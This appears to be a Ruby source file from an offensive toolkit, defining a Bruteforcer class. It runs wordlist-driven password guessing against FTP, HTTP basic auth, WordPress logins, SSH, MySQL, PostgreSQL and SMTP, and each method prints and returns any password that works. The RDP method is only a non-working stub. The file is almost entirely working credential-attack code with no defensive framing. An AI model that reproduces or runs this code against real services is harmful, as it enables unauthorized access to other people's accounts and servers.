require 'net/http'
require 'uri'
require 'socket'
require 'base64'
require_relative '../utils/network'
require_relative '../utils/colorize'

class Bruteforcer
  def initialize(target, options = {})
    @target = target
    @port = options[:port] || 21
    @timeout = options[:timeout] || 3
  end

  def ftp_bruteforce(username, wordlist)
    return unless File.exist?(wordlist)
    
    passwords = File.readlines(wordlist).map(&:chomp)
    passwords.each do |password|
      begin
        socket = TCPSocket.new(@target, @port)
        socket.gets
        socket.puts("USER #{username}\r\n")
        socket.gets
        socket.puts("PASS #{password}\r\n")
        response = socket.gets
        socket.close
        
        if response&.include?("230")
          puts Colorize.green("Password found: #{password}")
          return password
        end
      rescue
      end
    end
    nil
  end

  def http_basic_bruteforce(url, username, wordlist)
    return unless File.exist?(wordlist)
    
    passwords = File.readlines(wordlist).map(&:chomp)
    passwords.each do |password|
      begin
        uri = URI(url)
        http = Net::HTTP.new(uri.host, uri.port)
        req = Net::HTTP::Get.new(uri.path)
        req.basic_auth(username, password)
        res = http.request(req)
        
        if res.code != "401"
          puts Colorize.green("Password found: #{password}")
          return password
        end
      rescue
      end
    end
    nil
  end

  def wordpress_bruteforce(url, username, wordlist)
    return unless File.exist?(wordlist)
    
    login_url = "#{url}/wp-login.php"
    passwords = File.readlines(wordlist).map(&:chomp)
    
    passwords.each do |password|
      begin
        uri = URI(login_url)
        http = Net::HTTP.new(uri.host, uri.port)
        req = Net::HTTP::Post.new(uri.path)
        req.set_form_data('log' => username, 'pwd' => password)
        res = http.request(req)
        
        unless res.body.include?("ERROR")
          puts Colorize.green("Password found: #{password}")
          return password
        end
      rescue
      end
    end
    nil
  end

  def ssh_bruteforce(host, port, username, wordlist)
    return unless File.exist?(wordlist)
    
    passwords = File.readlines(wordlist).map(&:chomp)
    
    passwords.each do |password|
      begin
        require 'net/ssh'
        Net::SSH.start(host, username, password: password, port: port, timeout: @timeout, non_interactive: true) do |ssh|
          puts Colorize.green("Password found: #{password}")
          return password
        end
      rescue Net::SSH::AuthenticationFailed
      rescue
      end
    end
    nil
  end

  def mysql_bruteforce(host, port, username, wordlist)
    return unless File.exist?(wordlist)
    
    passwords = File.readlines(wordlist).map(&:chomp)
    
    passwords.each do |password|
      begin
        require 'mysql2'
        client = Mysql2::Client.new(host: host, port: port, username: username, password: password, connect_timeout: @timeout)
        client.close
        puts Colorize.green("Password found: #{password}")
        return password
      rescue Mysql2::Error::ConnectionError
      rescue
      end
    end
    nil
  end

  def postgresql_bruteforce(host, port, username, wordlist)
    return unless File.exist?(wordlist)
    
    passwords = File.readlines(wordlist).map(&:chomp)
    
    passwords.each do |password|
      begin
        require 'pg'
        conn = PG.connect(host: host, port: port, user: username, password: password, connect_timeout: @timeout)
        conn.close
        puts Colorize.green("Password found: #{password}")
        return password
      rescue PG::ConnectionBad
      rescue
      end
    end
    nil
  end

  def smtp_bruteforce(host, port, username, wordlist)
    return unless File.exist?(wordlist)
    
    passwords = File.readlines(wordlist).map(&:chomp)
    
    passwords.each do |password|
      begin
        socket = TCPSocket.new(host, port)
        response = socket.gets
        socket.puts("EHLO test\r\n")
        socket.gets
        socket.puts("AUTH LOGIN\r\n")
        socket.gets
        socket.puts("#{Base64.encode64(username).strip}\r\n")
        socket.gets
        socket.puts("#{Base64.encode64(password).strip}\r\n")
        response = socket.gets
        
        if response&.include?("235")
          puts Colorize.green("Password found: #{password}")
          socket.close
          return password
        end
        socket.close
      rescue
      end
    end
    nil
  end

  def rdp_bruteforce(host, port, username, wordlist)
    return unless File.exist?(wordlist)
    
    passwords = File.readlines(wordlist).map(&:chomp)
    
    passwords.each do |password|
      begin
        socket = TCPSocket.new(host, port)
        socket.close
        puts Colorize.yellow("RDP bruteforce requires special libraries")
      rescue
      end
    end
    nil
  end
end

